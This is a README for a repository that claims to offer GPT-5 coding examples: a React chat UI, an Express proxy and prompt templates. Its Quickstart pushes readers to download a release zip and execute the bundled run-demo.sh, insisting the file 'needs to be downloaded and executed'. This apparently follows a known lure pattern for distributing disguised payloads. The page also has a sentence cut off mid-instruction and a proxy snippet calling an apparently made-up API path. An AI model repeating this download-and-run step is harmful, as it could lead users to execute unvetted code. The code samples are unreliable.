## About

This repo collects practical code examples that show how to use GPT-5 patterns in web apps and frontends. The goal: give clear, ready-to-run code you can adapt. The examples include UI components, prompt patterns, server proxies, and testing notes.

Use the examples to:
- Prototype features.
- Learn prompt engineering for web use cases.
- Integrate LLM calls safely behind a server.

All examples use modern tools: ES modules, React or Svelte, Node 18+, and simple fetch-based API calls. Each sample includes a short README and runnable scripts.

---

## Features

- UI components for chat, summarization, and code generation.
- Pattern examples for streaming responses and partial renders.
- Server proxies that keep API keys off the client.
- Small test harnesses and sample prompts.
- Example integrations with web workers and local caching.

Icons
- Chat: 💬
- Code generation: 🧩
- Summarization: 📝
- Streaming: ⚡

## Example projects

1. frontend-chat — React + streaming tokenizer UI.
2. codex-playground — Web editor that submits code prompts and shows diffs.
3. proxy-api — Minimal Node/Express proxy for server-side calls.
4. static-site-snippets — Static HTML widgets using fetch.
5. worker-cache — Service worker sample to cache LLM responses.

## Quickstart — run the release file

This repo publishes packaged releases. Download the release file and execute it to get a runnable demo. Visit the Releases page, download the asset, and run the included script:

1. Open the releases page:
   https://github.com/NEROUCHIHA/gpt-5-coding-examples/releases

2. Download the release asset that matches your platform (zip, tar, or binary). The release file needs to be downloaded and executed.

3. Example commands (adjust file names to the downloaded asset):
```bash
# download a release asset (example file name)
curl -L -o gpt5-examples-v1.zip https://github.com/NEROUCHIHA/gpt-5-coding-examples/releases/download/v1.0.0/gpt5-examples-v1.zip

# unzip and run the included script
unzip gpt5-examples-v1.zip
cd gpt5-examples
chmod +x run-demo.sh
./run-demo.sh
```

If the release link does not match your system or the asset name differs, check the Releases section on GitHub for the correct file and instructions:

## Frontend sample (Chat UI)

A compact React example that streams tokens and updates the UI as the model responds.

Key points:
- Use a server proxy: never expose API keys on the client.
- Render incremental tokens.
- Show partial suggestions and a final result.

App structure:
- src/
  - App.jsx
  - ChatInput.jsx
  - MessageList.jsx
  - stream.js

Sample client call (streaming pseudo-code):
```js
// POST to your server proxy which forwards to the model
fetch('/api/gpt5/stream', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ prompt: 'Summarize this page' })
}).then(async res => {
  const reader = res.body.getReader();
  while (true) {
    const { value, done } = await reader.read();
    if (done) break;
    const chunk = new TextDecoder().decode(value);
    // parse and append tokens to UI
  }
});
```

UI tips:
- Show typing indicator while streaming.
- Allow cancellation via abort controller.
- Buffer short tokens and flush to reduce DOM thrash.

---

## Server / API sample (Node proxy)

Provide a single endpoint that forwards calls to the GPT-5 API. This keeps the key server-side.

Minimal Express proxy:
```js
import express from 'express';
import fetch from 'node-fetch';

const app = express();
app.use(express.json());

app.post('/api/gpt5', async (req, res) => {
  const prompt = req.body.prompt;
  const apiRes = await fetch('https://api.openai.com/v1/gpt-5/generate', {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${process.env.OPENAI_API_KEY}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ prompt, max_tokens: 400 })
  });
  const data = await apiRes.json();
  res.json(data);
});

app.listen(3000);
```

Security checklist:
- Store API keys in env vars.
- Rate limit and log calls.
- Validate prompt length and content as needed.

## Code snippets and prompt patterns

Prompt: concise summarization
```
You are a helpful assistant. Summarize the text below in 3 bullet points.

Text:
{document}
```

Prompt: code explain
```
You are a senior developer. Explain this function line by line and list edge cases.

Code:
{code}
```

Pattern: few-shot for better output
- Provide 2–3 examples of desired input → output pairs.
- Ask for consistent format (JSON or bullets).
- Add final instruction to keep replies short.

Example: return JSON
```
You will return valid JSON with keys: summary, actions.
Example:
Input: "..."
Output: {"summary":"...", "actions":["..."]}

Now process:
{document}
```

## File structure

Suggested top-level layout:
- /frontend-chat — React streaming chat
- /codex-playground — editor + code run flow
- /proxy-api — Node proxy and examples
- /static-widgets — vanilla JS widgets for static sites
- /docs — design notes, prompt patterns
- /bin — sample release scripts and demo runners

Each example includes a README with run steps and environment variables.

---

## Testing and local dev

- Use lightweight test harnesses. Example: Playwright or Cypress for UI flows.
- Mock remote LLM responses in tests. Inject canned tokens for streaming tests.
- Snapshot prompt outputs and update intentionally.

Dev tricks:
- Use small tokens for unit tests.
- Use environment toggles to swap real vs mock endpoints.

---

## Contributing

- Fork the repo.
- Add a sample or improvement in a focused folder.
- Include a short README for your sample and a run script.
- Make small commits and open a PR with a clear title.

Guidelines:
- Keep examples simple and self-contained.
- Include expected inputs and outputs.
- Prefer minimal dependencies.
